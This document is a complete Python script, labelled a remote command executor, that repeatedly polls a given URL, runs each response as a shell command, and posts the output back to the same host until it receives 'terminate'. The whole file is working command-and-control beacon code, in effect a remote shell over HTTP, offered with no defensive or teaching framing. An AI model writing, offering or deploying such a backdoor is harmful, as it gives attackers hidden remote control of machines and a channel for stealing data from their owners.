import requests
import subprocess
import time
import argparse
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def parse_arguments():
    parser = argparse.ArgumentParser(description='Remote command executor.')
    parser.add_argument('target_url', type=str, help='The target URL to send commands to.')
    parser.add_argument('--sleep', type=int, default=3, help='Time to wait between requests in seconds.')
    return parser.parse_args()

def execute_command(command):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = process.communicate()
        return output.decode('utf-8'), error.decode('utf-8')
    except Exception as e:
        logging.error(f"Error executing command '{command}': {e}")
        return '', str(e)

def post_results(target_url, output, error):
    try:
        if output:
            requests.post(target_url, data=output)
        if error:
            requests.post(target_url, data=error)
    except requests.exceptions.RequestException as e:
        logging.error(f"Error posting results: {e}")

def main():
    args = parse_arguments()
    target_url = args.target_url
    sleep_time = args.sleep

    while True:
        try:
            response = requests.get(target_url)
            command = response.text.strip()

            if command.lower() == 'terminate':
                logging.info("Received termination command.")
                break

            logging.info(f"Executing command: {command}")
            output, error = execute_command(command)
            post_results(target_url, output, error)
            time.sleep(sleep_time)

        except requests.exceptions.RequestException as e:
            logging.error(f"Error sending request: {e}")
            time.sleep(sleep_time)

if __name__ == '__main__':
    main()
